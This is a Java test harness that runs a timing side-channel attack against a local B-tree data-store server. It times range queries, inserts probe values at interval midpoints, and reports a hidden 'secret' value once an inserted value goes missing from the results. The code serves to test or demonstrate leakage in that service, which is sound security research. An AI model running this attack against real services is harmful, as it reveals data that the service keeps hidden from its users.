/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package dstore.app;

import static dstore.app.CommandLineApp.btree;
import static dstore.app.DStoreClientMod.IDMAX;
import static dstore.app.DStoreClientMod.IDMIN;
import java.io.IOException;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author user
 */
public class TestHarnessRemote {

    public static DStoreClientMod btree = null;
    public static int MinTimingForIntervalWithSecret = 1450000;
    public static int THRESHOLD = 1850000;
    public static int MAXOPERATIONS = -1;
    private static int operations = 0;

    //SET THIS TO SOMETHING OTHER THAN -1 TO MAKE THE HARNESS STOP WHEN WE GET HERE -- ALTHOUGH
    //IT SHOULD STOP ANYWAY
    public static int WORSTCASESECRET = 25437474;
    private static int secretcount = 0;

    //WE SHOUDL ANY VAL WE INSERT IN A RANGE QUERY...IF WE DO NOT, IT'S A SECRET
    public static List<Integer> valsThatAttackerInserted;
    public static int iters;

    public static void main(String[] args) throws IOException {

        System.out.println("IF I'M HANGING HERE TOO LONG, EITHER THE SERVER IS NOT RUNNING ");
        System.out.println("OR YOU STARTED ME BEFORE THE SERVER COMPLETED ITS STARTUP ROUTINE, JUST KILL ME AND TRY AGAIN");
        
        boolean dotally = false;

        valsThatAttackerInserted = new ArrayList<Integer>();
        intervalsresolved = new HashMap<String, String>();
        //Nothing will be in this interval, it does not contain valid ids
        intervalsresolved.put(0 + "-" + IDMIN, 0 + "-" + IDMIN);
        intervalsresolved.put(1 + "-" + IDMIN, 0 + "-" + IDMIN);

        if (args.length >= 1) {
            MAXOPERATIONS = Integer.valueOf(args[0]);
        }

        btree = new DStoreClientMod();
        btree.connect("127.0.0.1", DStoreClientMod.PORT);

        if (dotally) {
            dotally();
        }

        boolean secretsstillexist = true;
         iters = 0;

        //Add these so we can search the intervals between them
        btree.add(IDMIN, IDMIN, true);
        incOperations();
        valsThatAttackerInserted.add(IDMIN);
        btree.add(IDMAX, IDMAX, true);
        incOperations();
        valsThatAttackerInserted.add(IDMAX);

        int countdowntogiveup = 10;
        while (secretsstillexist) {
            List<Integer> allretvals = new ArrayList<Integer>();
            ArrayList<Interval> testInterval = testInterval(btree, 0, IDMAX + 1, true, allretvals);

            testThatValuesttackerInsertedAreVisable(allretvals);

            List<Interval> added = addmiddle(testInterval);
            if (added.size() == 0) {

                if (countdowntogiveup == 0) {
                    secretsstillexist = false;
                }
                countdowntogiveup--;
            } else {
                countdowntogiveup = 10;
            }

            iters++;

            System.out.println("Running another step:" + iters);
        }

    }

    public static HashMap<String, String> intervalsresolved;

    public static void tally(Map<String, Integer> tally, ArrayList<Interval> testInterval) {

        Iterator<Interval> it = testInterval.iterator();
        while (it.hasNext()) {
            Interval next = it.next();
            Integer t = 0;
            if (tally.containsKey(next.min + ":" + next.max)) {
                t = tally.get(next.min + ":" + next.max);
            }
            t++;
            tally.put(next.min + ":" + next.max, t);
        }

    }

    public static void incOperations() {

        operations++;
        if (MAXOPERATIONS != -1) {
            if (operations > MAXOPERATIONS) {
                System.exit(1);
            }
        }
    }

    public static List<Interval> addmiddle(List<Interval> interval) throws IOException {

        List<Interval> currinterval = new ArrayList<Interval>();

        Iterator<Interval> it = interval.iterator();
        //boolean foundwcase = false;
        while (it.hasNext()) {

            Interval next = it.next();

            if (intervalsresolved.containsKey(next.min + "-" + next.max)) {
                continue;
            }
            int diff = next.max - next.min;
            {
                int half = 0;
                ///if(diff>1)
                half = diff / 2;
                //else
                //    half=1;
                if (diff == 1) {
                    half = 0;
                }
                if (diff == 2) {
                    half = 1;
                }

                
                System.out.println("Adding: " + (next.min + half) + " between:[" + next.min + "," + next.max + "]");
                boolean added = btree.add(next.min + half, next.min + half, false);
                incOperations();
                valsThatAttackerInserted.add(next.min + half);
               // ArrayList<Integer> addres = btree.search(next.min + half, next.min + half);
                /*incOperations();
                 if (addres.size() == 0) {

                 int secret = next.min + half;
                 secretcount++;
                 System.out.println("FOUND A SECRET:" + secret + ",it took " + operations + " operations");
                 System.out.println("The number of secrets found so far is:" + secretcount);

                 //JUST FOR TESTING, BECAUSE WHEN I FIND THIS A NEW AREA WITHOUT A SECRET MAY BE NOISY AND I WOULD KEEP SEARCHING UNTIL I ELIMINATE IT
                 if (WORSTCASESECRET == secret) {
                 foundwcase = true;
                 break;

                 }
                 intervalsresolved.put(next.min + "-" + next.max, next.min + "-" + next.max);
                 } else {*/
                Interval int1 = new Interval(next.min, next.min + half, next.steps + 1);
                Interval int2 = new Interval(next.min + half, next.max, next.steps + 1);
                currinterval.add(int1);
                currinterval.add(int2);
                
                System.out.println("Just searched again");
                //}

            }
        }
        /*if (foundwcase == true) {
            System.out.println("WE FOUND THE WORST CASE THIS ROUND:" + WORSTCASESECRET);
            System.exit(1);
        }*/
        return currinterval;

    }

    private static DatagramSocket clientSocket;
    private static InetAddress IPAddress;

    private static void dotally() throws IOException {
        Map<String, Integer> tally = new HashMap<String, Integer>();
        boolean secretsstillexist = true;
        while (secretsstillexist) {
            ArrayList<Interval> testInterval = testInterval(btree, 0, IDMAX + 1, true,null);

            tally(tally, testInterval);

            System.out.println("Running another step");
        }

        Iterator<String> it = tally.keySet().iterator();
        int i = 0;
        while (it.hasNext()) {
            String next = it.next();
            System.out.println(i + ":" + next + ":" + tally.get(next));
            i++;
        }

    }

    private static void testThatValuesttackerInsertedAreVisable(List<Integer> testInterval) {

        Iterator<Integer> it = valsThatAttackerInserted.iterator();
        while (it.hasNext()) {
            Integer v = it.next();
            boolean foundit=false;
            Iterator<Integer> iterator = testInterval.iterator();
            //System.out.println("v:"+v);
            while(iterator.hasNext()){
                
                Integer next = iterator.next();
                
                if(next.hashCode() == v.intValue() ){
                    foundit=true;
                    //System.out.println("v is found:"+v);
                    break;
                }
                //WE ARE GOOD
            } 
            if(foundit==false){
                //THIS MUST BE A SERCET, WE ADDED IT, BUT IT IS NOT THERE
                System.out.println("WE FOUND A SECRET:" + v);
                System.out.println("TOTAL OPERATIONS TO MAKE DISTINCT CLIENT REQUESTS TO SERVER:" + operations);
                System.out.println("TOTAL ITERATIONS OF ATTACK:" + iters);

                
                System.exit(1);
            }

        }
    }

    public static class Interval {

        int min;
        int max;
        //int startsearchpoint;
        int steps;

        public Interval(int min, int max, int steps) {
            this.min = min;
            this.max = max;
            //this.startsearchpoint = startsearchpoint;
            this.steps = steps;

        }
    }

    public static ArrayList<Interval> testInterval(DStoreClientMod btree, int min, int max, boolean beverbose, List<Integer> allretvals) throws IOException {
        ArrayList<Interval> suspicousintervals = new ArrayList<Interval>();
        ArrayList<Long> times = new ArrayList<Long>();
        ArrayList<Integer> search = btree.searchtimes(min, max, times);
        incOperations();

        Iterator<Integer> it = search.iterator();
        int ind = 0;
        int lastval = 0;
        //System.out.println("\nNote: We will now call the secondary side channel to find out where the secret value lies in the interval indicated by the binary search");
        //System.out.println("The secondary side channel runs a interval search against the index and it looks for intervals with timings greater than 700000 nano seconds.  \nThis indicates a hidden secret is located between values");

        while (it.hasNext()) {

            Integer next = it.next();
            allretvals.add(next);

            if (beverbose) {
                System.out.println("\t interval search values [" + lastval + "," + next + "] time:" + times.get(ind));
            }
            Interval interval = new Interval(lastval + 1, next, 1);
            if ((times.get(ind) > THRESHOLD) && interval.min>1 ) {
                if(interval.min <= WORSTCASESECRET  && interval.max >= WORSTCASESECRET){
                System.out.println("Time has exceeded the THRESHOLD, time is:" + times.get(ind));
                }
                //System.out.println("\nOur search indicates that a secret value is in the range:");
                //System.out.println(" [min:" + (lastval + 1) + " to max val:" + (next - 1) + "]");

                suspicousintervals.add(interval);

            } else if (times.get(ind) < MinTimingForIntervalWithSecret) {

                //THIS VALUE IS TOO SMALL, IT COULD NEVER HOLD A SECRET
                intervalsresolved.put(interval.min + "-" + interval.max, interval.min + "-" + interval.max);

            }
            lastval = next;
            ind++;

        }
        return suspicousintervals;

    }

}
